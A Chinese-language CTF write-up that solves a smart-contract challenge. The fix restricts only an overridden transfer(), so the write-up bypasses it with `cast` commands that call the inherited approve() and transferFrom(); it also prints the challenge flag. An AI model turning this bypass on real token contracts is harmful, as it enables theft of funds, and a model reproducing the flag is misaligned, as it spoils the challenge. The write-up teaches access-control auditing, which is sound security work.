# ShellCoin Heritage

## 题目简述

`ShellCoin` 继承一个简化 ERC-20。`hireExecutor()` 会给调用者铸造全部 `133713371333337` 个 token，但子合约只在重写的 `transfer()` 上施加“执行人身份”和“部署 30 年后”两个限制。继承来的 `approve()` 与 `transferFrom()` 没有时间检查，因此可以沿另一条公开转账路径绕过限制，把全部 token 发送到 `Setup.isSolved()` 指定的地址。

## 解题过程

先读取目标地址，并成为唯一的遗嘱执行人：

```bash
TARGET=$(cast call "$SETUP" "TARGET()(address)" --rpc-url "$RPC")
cast send "$TARGET" "hireExecutor()" \
  --rpc-url "$RPC" \
  --private-key "$PLAYER_PRIVATE_KEY"
```

此时玩家获得全部初始供应量。直接调用 `transfer()` 会进入 `itsTherightTime`，但基类的 `approve()` 和 `transferFrom()` 仍然公开。先授权玩家自己作为 spender：

```bash
AMOUNT=133713371333337
DESTINATION=0xAf57Ac75f227363bB9D4d61872d81DE340BCc395

cast send "$TARGET" "approve(address,uint256)" \
  "$PLAYER_ADDRESS" "$AMOUNT" \
  --rpc-url "$RPC" \
  --private-key "$PLAYER_PRIVATE_KEY"
```

再以玩家同时作为 token owner 与 spender 调用 `transferFrom`：

```bash
cast send "$TARGET" "transferFrom(address,address,uint256)" \
  "$PLAYER_ADDRESS" "$DESTINATION" "$AMOUNT" \
  --rpc-url "$RPC" \
  --private-key "$PLAYER_PRIVATE_KEY"
```

`transferFrom()` 最终调用未受时间 modifier 保护的 `_transferFrom()`，目标地址余额达到检查值。官方解法给出的 flag 为：

```text
shellmates{the_CONTrACT_1nheRiT3d__4nD_ThE_GR4nDSOn_d1D_n0t__th4T$_1mProPer_acCes$_c0nTRoL}
```

## 方法总结

- 核心技巧：从继承的完整 ERC-20 外部接口寻找未施加同等限制的替代状态迁移路径。
- 识别信号：子合约只重写或保护一个公开入口，而基类还存在 `transferFrom`、mint、burn、callback 等等价路径时，应做接口级访问控制审计。
- 复用要点：安全约束必须覆盖所有能达到同一敏感状态变化的入口；只给最显眼的函数加 modifier 并不能建立完整权限边界。
